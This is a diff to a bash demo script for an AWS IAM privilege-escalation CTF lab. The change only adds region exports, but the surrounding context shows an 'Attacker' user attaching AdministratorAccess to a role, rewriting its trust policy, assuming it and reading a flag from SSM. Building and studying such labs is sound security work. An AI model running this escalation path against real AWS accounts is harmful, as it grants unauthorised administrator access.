@@ -115,6 +115,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -133,6 +134,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -142,6 +144,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -155,6 +158,7 @@ echo ""
 echo -e "${YELLOW}Step 4.5: Verifying starting user does NOT have sts:AssumeRole permission${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is crucial to the attack - the user shouldn't need sts:AssumeRole in their policy"
 echo "because being named in a trust policy grants assumption permission from the role's side"
 echo ""
@@ -178,6 +182,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Checking target role's initial trust policy${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
 echo "Target role: $TARGET_ROLE_ARN"
 echo ""
@@ -209,6 +214,7 @@ echo -e "${GREEN}✓ Target role currently has no admin access${NC}\n"
 echo -e "${YELLOW}Step 7: Attaching AdministratorAccess policy to target role${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the first privilege escalation action!"
 echo ""
 
@@ -228,6 +234,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 8: Verifying policy attachment${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
 echo "Updated attached policies on target role:"
 aws iam list-attached-role-policies \
@@ -241,6 +248,7 @@ echo -e "${GREEN}✓ AdministratorAccess policy is now attached${NC}\n"
 echo -e "${YELLOW}Step 9: Updating target role trust policy${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the second privilege escalation action!"
 echo "Modifying trust policy to explicitly allow: $CURRENT_USER"
 echo ""
@@ -278,6 +286,7 @@ echo -e "${GREEN}✓ Trust policy propagated${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying trust policy update${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Current trust policy:"
 show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
 aws iam get-role \
@@ -291,6 +300,7 @@ echo -e "${GREEN}✓ Trust policy now allows starting user to assume the role${N
 echo -e "${YELLOW}Step 11: Assuming the target role with admin permissions${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Role ARN: $TARGET_ROLE_ARN"
 echo ""
 echo "Note: Starting user does NOT have sts:AssumeRole permission"
@@ -310,6 +320,7 @@ export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 # Keep region consistent
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Verify we assumed the role
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -337,6 +348,7 @@ echo ""
 echo -e "${YELLOW}Step 13: Capturing the CTF flag${NC}"
 # Role session credentials are already active from the assume-role step above
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Reading CTF flag from SSM Parameter Store using admin role session..."
 echo ""
 
